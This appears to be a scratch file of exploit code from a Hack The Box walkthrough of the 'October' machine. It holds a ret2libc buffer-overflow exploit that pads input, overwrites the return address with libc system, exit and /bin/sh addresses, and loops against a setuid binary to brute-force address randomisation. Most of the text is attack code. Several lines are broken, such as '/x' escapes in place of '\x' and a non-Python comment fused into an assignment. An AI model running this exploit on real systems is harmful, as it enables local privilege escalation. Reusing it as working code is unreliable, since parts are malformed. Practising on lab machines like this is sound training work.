'''
###############################################################################
https://blog.artis3nal.com/2020-08-14-htb-october-msf/
https://www.youtube.com/watch?v=NCLUm8geskU

#while true;do ./fml $(python3 vulnExploit.py);done
#!/usr/bin/env python
from struct import *

libc = ""
system = "0xf7d73e10" convert little endian
exit = "0xf7d67060"
bash = "0xf7eb288f"


offset = 256
pattern = "A" * offset
buf = ""
buf += "/x10/x3e/xd7/xf7"
buf += "/x60/x70/xd6/xf7"
buf += "/x8f/x28/xeb/xf7"

#buf += str(pack("<L",0xf7d77e10)) # system
#buf += str(pack("<L",0xf7d6b060)) # exitw
#buf += str(pack("<L",0xf7eb688f)) # /bin/sh

buffer = pattern + buf

print(buffer + '/n')


########################################################

baseSystem = 0x0003ce10
baseExit = 0x00030060
baseBash = 0x0017b88f

"$(python -c 'print "A" * 16 + "/x10/xde/xe1/xf7" + "/x60/x10/xe1/xf7" + "/x8f/xc8/xf5/xf7"')"

while true;do ./fml $(python -c 'print "A" * 16 + "/x10/xde/xe1/xf7" + "/x60/x10/xe1/xf7" + "/x8f/xc8/xf5/xf7"');done

'''
from subprocess import call
import struct

buffersled = "A"*16

libc = 0xf7ce5000
system = struct.pack('<I', libc + 0x0003ce10)
exit = struct.pack('<I', libc + 0x00030060)
binsh = struct.pack('<I', libc + 0x0017b88f)

payload = buffersled + system + exit + binsh


i = 0
while (i < 512):
    print("Try %s" % i)
    i += 1
    ret = call(["./fml", payload])
